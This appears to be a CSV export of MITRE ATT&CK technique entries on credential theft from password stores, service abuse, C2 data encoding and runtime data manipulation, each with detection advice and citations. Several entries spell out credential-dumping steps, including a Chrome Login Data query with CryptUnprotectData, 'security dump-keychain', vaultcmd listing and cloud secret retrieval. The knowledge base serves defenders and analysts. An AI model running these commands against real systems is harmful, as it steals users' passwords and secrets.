Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",Windows,"Command: Command Execution, Driver: Driver Load, File: File Metadata, Network Traffic: Network Traffic Flow, Process: OS API Execution, Process: Process Creation, Service: Service Creation, Service: Service Modification, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1543,,"Akshat Pradhan, Qualys; Matthew Demaske, Adaptforward; Mayuresh Dani, Qualys; Pedro Harrison; Wietze Beukema, @wietze",,,,,"Administrator, SYSTEM","(Citation: Symantec Orangeworm April 2018),(Citation: FinFisher Citation),(Citation: ESET TeleBots Oct 2018),(Citation: SANS Conficker),(Citation: Bitdefender StrongPity June 2020),(Citation: Microsoft FinFisher March 2018),(Citation: Symantec Hydraq Jan 2010),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: FireEye WannaCry 2017),(Citation: Dell Lateral Movement),(Citation: Cylance Cleaver),(Citation: Talent-Jump Clambling February 2020),(Citation: Mandiant FIN12 Oct 2021),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Novetta Blockbuster),(Citation: TrendMicro PE_URSNIF.A2),(Citation: ESET Carbon Mar 2017),(Citation: Symantec Naid June 2012),(Citation: Russinovich Sysinternals),(Citation: TrendMicro EarthLusca 2022),(Citation: Avertium Black Basta June 2022),(Citation: Palo Alto Reaver Nov 2017),(Citation: CISA AA20-301A Kimsuky),(Citation: Github PowerShell Empire),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Securelist Kimsuky Sept 2013),(Citation: Symantec Catchamas April 2018),(Citation: Lunghi Iron Tiger Linux),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Talos Bisonal Mar 2020),(Citation: Trustwave GoldenSpy June 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Dell Sakula),(Citation: Dragos Crashoverride 2017),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Unit 42 PingPull Jun 2022),(Citation: CISA AppleJeus Feb 2021),(Citation: ESET Attor Oct 2019),(Citation: Kaspersky Carbanak),(Citation: FireEye APT41 Aug 2019),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: NCC Group Black Basta June 2022),(Citation: US-CERT Bankshot Dec 2017),(Citation: Emissary Trojan Feb 2016),(Citation: ESET Okrum July 2019),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Gh0stRAT ATT March 2019),(Citation: Mandiant UNC3890 Aug 2022),(Citation: F-Secure Cosmicduke),(Citation: TrendMicro Lazarus Nov 2018),(Citation: Talos Promethium June 2020),(Citation: Binary Defense Emotes Wi-Fi Spreader),(Citation: Symantec Volgmer Aug 2014),(Citation: Microsoft Wingbird Nov 2017),(Citation: Nccgroup Gh0st April 2018),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: McAfee Cuba April 2021),(Citation: Securelist DarkVishnya Dec 2018),(Citation: Symantec Darkmoon Aug 2005),(Citation: FOX-IT May 2016 Mofang),(Citation: Cylance Dust Storm),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET PipeMon May 2020),(Citation: FireEye APT41 March 2020),(Citation: Mandiant APT1 Appendix),(Citation: Bitdefender Naikon April 2021),(Citation: ThreatStream Evasion Analysis),(Citation: Symantec Briba May 2012),(Citation: FireEye FIN7 Aug 2018),(Citation: Palo Alto Networks BBSRAT),(Citation: Group IB APT 41 June 2021),(Citation: Microsoft SIR Vol 21),(Citation: Minerva Labs Black Basta May 2022),(Citation: Sophos Ragnar May 2020),(Citation: Unit 42 Kazuar May 2017),(Citation: Lotus Blossom Jun 2015),(Citation: ESET GreyEnergy Oct 2018),(Citation: MoustachedBouncer ESET August 2023),(Citation: Lastline PlugX Analysis),(Citation: F-Secure CozyDuke),(Citation: TrendMicro RawPOS April 2015),(Citation: NCC Group APT15 Alive and Strong),(Citation: Symantec Hydraq Persistence Jan 2010),(Citation: Malwarebytes Konni Aug 2021),(Citation: Group IB Cobalt Aug 2017),(Citation: NCC Group WastedLocker June 2020),(Citation: McAfee Bankshot),(Citation: ESET Gelsemium June 2021),(Citation: PowerSploit Documentation),(Citation: F-Secure BlackEnergy 2014),(Citation: ASERT InnaputRAT April 2018),(Citation: Check Point Sunburst Teardrop December 2020),(Citation: US-CERT Volgmer Nov 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: Cyberreason Anchor December 2019),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Cylance Shell Crew Feb 2017),(Citation: Symantec Backdoor.Nidiran),(Citation: LogRhythm WannaCry),(Citation: McAfee Honeybee),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Mandiant UNC3313 Feb 2022),(Citation: Palo Alto MoonWind March 2017),(Citation: ESET OceanLotus),(Citation: CIRCL PlugX March 2013),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Symantec Dyre June 2015),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: ESET LoudMiner June 2019),(Citation: McAfee Night Dragon),(Citation: Symantec W32.Duqu),(Citation: Rapid7 KeyBoy Jun 2013),(Citation: ESET Sednit Part 1),(Citation: GitHub PowerSploit May 2012),(Citation: Secureworks Emotet Nov 2018),(Citation: Kroll RawPOS Jan 2017),(Citation: Proofpoint ZeroT Feb 2017),(Citation: CyberBit Dtrack),(Citation: Crowdstrike Indrik November 2018),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Symantec Nerex May 2012),(Citation: Unit42 RDAT July 2020),(Citation: Unit 42 Shamoon3 2018),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Symantec Wiarp May 2012),(Citation: US-CERT Emotet Jul 2018),(Citation: PWC KeyBoys Feb 2017),(Citation: Talos ZxShell Oct 2014),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: FireEye APT10 April 2017),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: FireEye Operation Double Tap),(Citation: Microsoft Winnti Jan 2017),(Citation: ESET InvisiMole June 2020),(Citation: RedCanary Mockingbird May 2020),(Citation: Novetta Blockbuster Destructive Malware),(Citation: ClearSky Wilted Tulip July 2017),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Malicious Driver Reporting Center),(Citation: Microsoft driver block rules)"
T1555.006,attack-pattern--cfb525cc-5494-401d-a82b-2539ca46a561,Credentials from Password Stores: Cloud Secrets Management Stores,"Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.  

Secrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.  

If an adversary is able to gain sufficient privileges in a cloud environment – for example, by obtaining the credentials of high-privileged [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004) or compromising a service that has permission to retrieve secrets – they may be able to request secrets from the secrets manager. This can be accomplished via commands such as `get-secret-value` in AWS, `gcloud secrets describe` in GCP, and `az key vault secret show` in Azure.(Citation: Permiso Scattered Spider 2023)(Citation: Sysdig ScarletEel 2.0 2023)(Citation: AWS Secrets Manager)(Citation: Google Cloud Secrets)(Citation: Microsoft Azure Key Vault)

**Note:** this technique is distinct from [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005) in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.",https://attack.mitre.org/techniques/T1555/006,25 September 2023,30 September 2023,enterprise-attack,1.0,Credential Access,,IaaS,Cloud Service: Cloud Service Enumeration,True,T1555,,"Martin McCloskey, Datadog",,,,,,"(Citation: GitHub Pacu),"
T1555.003,attack-pattern--58a3e6aa-4453-4cc8-a51f-4befe80b31a8,Credentials from Password Stores: Credentials from Web Browsers,"Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.

For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)
 
Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).

Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)

After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",https://attack.mitre.org/techniques/T1555/003,12 February 2020,15 February 2022,enterprise-attack,1.1,Credential Access,"Identify web browser files that contain credentials such as Google Chrome’s Login Data database file: <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code>. Monitor file read events of web browser files that contain credentials, especially when the reading process is unrelated to the subject web browser. Monitor process execution logs to include PowerShell Transcription focusing on those that perform a combination of behaviors including reading web browser process memory, utilizing regular expressions, and those that contain numerous keywords for common web applications (Gmail, Twitter, Office365, etc.).","Linux, Windows, macOS","Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Access",True,T1555,,"Barry Shteiman, Exabeam; RedHuntLabs, @redhuntlabs; Ryan Benson, Exabeam; Sylvain Gil, Exabeam",User,,,,,"(Citation: Forcepoint Monsoon),(Citation: Trend Micro Muddy Water March 2021),(Citation: Bitdefender Agent Tesla April 2020),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Talos Smoke Loader July 2018),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Talos Group123),(Citation: Red Canary NETWIRE January 2020),(Citation: IBM IcedID November 2017),(Citation: Infoblox Lokibot January 2019),(Citation: Cymmetria Patchwork),(Citation: Symantec Inception Framework March 2018),(Citation: ESET Grandoreiro April 2020),(Citation: Check Point Warzone Feb 2020),(Citation: DustySky),(Citation: CISA AA20-301A Kimsuky),(Citation: NCSC Joint Report Public Tools),(Citation: Github PowerShell Empire),(Citation: Kaspersky Adwind Feb 2016),(Citation: FireEye APT33 Guardrail),(Citation: GitHub QuasarRAT),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Cybereason Chaes Nov 2020),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: GitHub LaZagne Dec 2018),(Citation: XAgentOSX 2017),(Citation: Mandiant UNC3890 Aug 2022),(Citation: GitHub Mimikatz lsadump Module),(Citation: Accenture Hogfish April 2018),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: objsee mac malware 2017),(Citation: Citizen Lab Group5),(Citation: Bitdefender Naikon April 2021),(Citation: Talos PoetRAT April 2020),(Citation: Unit42 OilRig Playbook 2023),(Citation: ESET Machete July 2019),(Citation: Secureworks Karagany July 2019),(Citation: Symantec Elfin Mar 2019),(Citation: ESET Zebrocy May 2019),(Citation: FireEye APT28),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: F-Secure BlackEnergy 2014),(Citation: Symantec Leafminer July 2018),(Citation: Symantec MuddyWater Dec 2018),(Citation: Cyberreason Anchor December 2019),(Citation: Fidelis njRAT June 2013),(Citation: Deply Mimikatz),(Citation: ESET Operation Groundbait),(Citation: IBM Grandoreiro April 2020),(Citation: Kaspersky QakBot September 2021),(Citation: Kaspersky Lyceum October 2021),(Citation: Zdnet Kimsuky Dec 2018),(Citation: FireEye NETWIRE March 2019),(Citation: Check Point Rocket Kitten),(Citation: Talos Olympic Destroyer 2018),(Citation: Unit42 CookieMiner Jan 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: JPCert TSCookie March 2018),(Citation: BiZone Lizar May 2021),(Citation: Rapid7 KeyBoy Jun 2013),(Citation: Symantec Buckeye),(Citation: F-Secure The Dukes),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: TrendMicro BlackTech June 2017),(Citation: Talos Kimsuky Nov 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Cybereason Kimsuky November 2020),(Citation: FireEye APT37 Feb 2018),(Citation: Volexity Patchwork June 2018),(Citation: Trend Micro njRAT 2018),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Securelist BlackEnergy Nov 2014),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Visa FIN6 Feb 2019),(Citation: ESET PLEAD Malware July 2018),(Citation: Proofpoint TA505 Sep 2017),(Citation: Prevx Carberp March 2011),(Citation: ESET Telebots Dec 2016),(Citation: Proofpoint NETWIRE December 2020),(Citation: Talos Konni May 2017),(Citation: FireEye APT34 July 2019),(Citation: Unit42 Azorult Nov 2018),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Trend Micro Emotet Jan 2019),(Citation: GitHub Pupy),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: Symantec Dragonfly),(Citation: Cisco H1N1 Part 2),(Citation: FireEye APT35 2018),"
T1555.001,attack-pattern--1eaebf46-e361-4437-bc23-d5d65a3b92e3,Credentials from Password Stores: Keychain,"Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple’s iCloud service. 

Keychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)

Adversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain –d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)  ",https://attack.mitre.org/techniques/T1555/001,12 February 2020,18 April 2022,enterprise-attack,1.1,Credential Access,"Unlocking the keychain and using passwords from it is a very common process, so there is likely to be a lot of noise in any detection technique. Monitoring of system calls to the keychain can help determine if there is a suspicious process trying to access it.",macOS,"Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Creation",True,T1555,,,,,,,,"(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: ESET DazzleSpy Jan 2022),(Citation: Symantec Calisto July 2018),(Citation: GitHub LaZagne Dec 2018),(Citation: Securelist Calisto July 2018),(Citation: objsee mac malware 2017),"
T1555.005,attack-pattern--315f51f0-6b03-4c1e-bfb2-84740afb8e21,Credentials from Password Stores: Password Managers,"Adversaries may acquire user credentials from third-party password managers.(Citation: ise Password Manager February 2019) Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.(Citation: ise Password Manager February 2019)

Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.(Citation: FoxIT Wocao December 2019)(Citation: Github KeeThief) Adversaries may extract credentials from memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).(Citation: NVD CVE-2019-3610)
 Adversaries may also try brute forcing via [Password Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master password of a password manager.(Citation: Cyberreason Anchor December 2019)",https://attack.mitre.org/techniques/T1555/005,22 January 2021,25 March 2022,enterprise-attack,1.0,Credential Access,"Consider monitoring API calls, file read events, and processes for suspicious activity that could indicate searching in process memory of password managers. 

Consider monitoring file reads surrounding known password manager applications.","Linux, Windows, macOS","Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Access",True,T1555,,"Matt Burrough, @mattburrough, Microsoft",User,,,,,"(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: FoxIT Wocao December 2019),(Citation: NCC Group LAPSUS Apr 2022),(Citation: Trend Micro DRBControl February 2020),(Citation: objsee mac malware 2017),(Citation: Cyberreason Anchor December 2019),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: NIST 800-63-3)"
T1555.002,attack-pattern--1a80d097-54df-41d8-9d33-34e755ec5e72,Credentials from Password Stores: Securityd Memory,"An adversary may obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)

In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)",https://attack.mitre.org/techniques/T1555/002,12 February 2020,08 March 2022,enterprise-attack,1.1,Credential Access,Monitor processes and command-line arguments for activity surrounded users searching for credentials or using automated tools to scan memory for passwords.,"Linux, macOS","Command: Command Execution, Process: Process Access",True,T1555,,,root,,,,,"(Citation: synack 2016 review),"
T1555.004,attack-pattern--d336b553-5da9-46ca-98a8-0b23f49fb447,Credentials from Password Stores: Windows Credential Manager,"Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)

The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.

Credential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)

Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)

Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the “Back up...” button on the “Stored User Names and Passwords” GUI.

Password recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)",https://attack.mitre.org/techniques/T1555/004,23 November 2020,21 October 2022,enterprise-attack,1.1,Credential Access,"Monitor process and command-line parameters of <code>vaultcmd.exe</code> for suspicious activity, such as listing credentials from the Windows Credentials locker (i.e., <code>vaultcmd /listcreds:“Windows Credentials”</code>).(Citation: Malwarebytes The Windows Vault)

Consider monitoring API calls such as <code>CredEnumerateA</code> that may list credentials from the Windows Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)

Consider monitoring file reads to Vault locations, <code>%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\</code>, for suspicious activity.(Citation: Malwarebytes The Windows Vault)",Windows,"Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Creation",True,T1555,,Bernaldo Penas Antelo; Mugdha Peter Bansode; Uriel Kosayev; Vadim Khrykov,,,,,,"(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: FireEye APT34 July 2019),(Citation: Cybereason Kimsuky November 2020),(Citation: Mandiant FIN12 Oct 2021),(Citation: Symantec Waterbug Jun 2019),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: GitHub PowerSploit May 2012),(Citation: PowerSploit Documentation),(Citation: Bitdefender Naikon April 2021),(Citation: SentinelOne Valak June 2020),(Citation: GitHub LaZagne Dec 2018),(Citation: Delpy Mimikatz Crendential Manager),(Citation: BiZone Lizar May 2021),(Citation: Talos Group123),(Citation: Microsoft Network access Credential Manager)"
T1132.002,attack-pattern--d467bc38-284b-4a00-96ac-125f447799fc,Data Encoding: Non-Standard Encoding,"Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) ",https://attack.mitre.org/techniques/T1132/002,14 March 2020,14 March 2020,enterprise-attack,1.0,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1132,,,User,,,,,"(Citation: NCSC Cyclops Blink February 2022),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: McAfee Oceansalt Oct 2018),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: McAfee Bankshot),(Citation: ESET InvisiMole June 2020),(Citation: Unit42 RDAT July 2020),(Citation: Securelist ShadowPad Aug 2017),(Citation: CYBERCOM Iranian Intel Cyber January 2022),(Citation: MoustachedBouncer ESET August 2023),(Citation: FireEye APT30),"
T1132.001,attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c,Data Encoding: Standard Encoding,"Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",https://attack.mitre.org/techniques/T1132/001,14 March 2020,03 March 2023,enterprise-attack,1.0,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1132,,,,,,,,"(Citation: Cofense Astaroth Sept 2018),(Citation: FireEye CARBANAK June 2017),(Citation: Bitdefender Sardonic Aug 2021),(Citation: Unit 42 Inception November 2018),(Citation: Forcepoint Monsoon),(Citation: Fysbis Dr Web Analysis),(Citation: Trend Micro Muddy Water March 2021),(Citation: GitHub Sliver HTTP),(Citation: CISA WellMess July 2020),(Citation: Trend Micro Tick November 2019),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Cymmetria Patchwork),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: McAfee Lazarus Nov 2020),(Citation: Medium KONNI Jan 2020),(Citation: Trend Micro IXESHE 2012),(Citation: Group IB GrimAgent July 2021),(Citation: Unit 42 SeaDuke 2015),(Citation: Unit 42 DarkHydrus July 2018),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Check Point APT34 April 2021),(Citation: Cylance Shaheen Nov 2018),(Citation: Palo Alto DNS Requests),(Citation: Lunghi Iron Tiger Linux),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye APT33 Guardrail),(Citation: Cybereason Chaes Nov 2020),(Citation: Unit 42 Playbook Dec 2017),(Citation: Unit 42 PingPull Jun 2022),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: ClearSky MuddyWater June 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Kaspersky Carbanak),(Citation: Microsoft PLATINUM April 2016),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Check Point APT35 CharmPower January 2022),(Citation: ESET Okrum July 2019),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Securelist Machete Aug 2014),(Citation: Gh0stRAT ATT March 2019),(Citation: Unit 42 MechaFlounder March 2019),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Microsoft POLONIUM June 2022),(Citation: Binary Defense Emotes Wi-Fi Spreader),(Citation: Zscaler Cobian Aug 2017),(Citation: Cylance Dust Storm),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Malwarebytes Saint Bot April 2021),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Unit 42 Kazuar May 2017),(Citation: Lotus Blossom Jun 2015),(Citation: Forcepoint Felismus Mar 2017),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Unit42 BabyShark Feb 2019),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: FireEye APT28),(Citation: Proofpoint Bumblebee April 2022),(Citation: Securelist Octopus Oct 2018),(Citation: Moran 2013),(Citation: Cyberreason Anchor December 2019),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Fidelis njRAT June 2013),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: ESET Operation Groundbait),(Citation: Palo Alto OilRig May 2016),(Citation: Kaspersky QakBot September 2021),(Citation: Unit42 Molerat Mar 2020),(Citation: Unit42 OceanLotus 2017),(Citation: Kaspersky Lyceum October 2021),(Citation: NTT Security Flagpro new December 2021),(Citation: JPCERT ChChes Feb 2017),(Citation: RotaJakiro 2021 netlab360 analysis),(Citation: Mandiant Suspected Turla Campaign February 2023),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Antiy CERT Ramsay April 2020),(Citation: FireEye APT34 Dec 2017),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Microsoft HAFNIUM March 2020),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: Unit 42 Valak July 2020),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Unit42 RDAT July 2020),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: ESET ForSSHe December 2018),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Crowdstrike Qakbot October 2020),(Citation: ESET Ebury Feb 2014),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Palo Alto menuPass Feb 2017),(Citation: Kaspersky Sofacy),(Citation: ESET Telebots Dec 2016),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Prevailion DarkWatchman 2021),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Symantec Dragonfly),(Citation: Security Intelligence More Eggs Aug 2019),"
T1565.003,attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490,Data Manipulation: Runtime Data Manipulation,"Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.

Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",https://attack.mitre.org/techniques/T1565/003,02 March 2020,25 March 2022,enterprise-attack,1.1,Impact,"Inspect important application binary file hashes, locations, and modifications for suspicious/unexpected values.","Linux, Windows, macOS","File: File Creation, File: File Deletion, File: File Metadata, File: File Modification, Process: OS API Execution",True,T1565,,,"Administrator, root, SYSTEM, User",,,Integrity,,"(Citation: FireEye APT38 Oct 2018),"
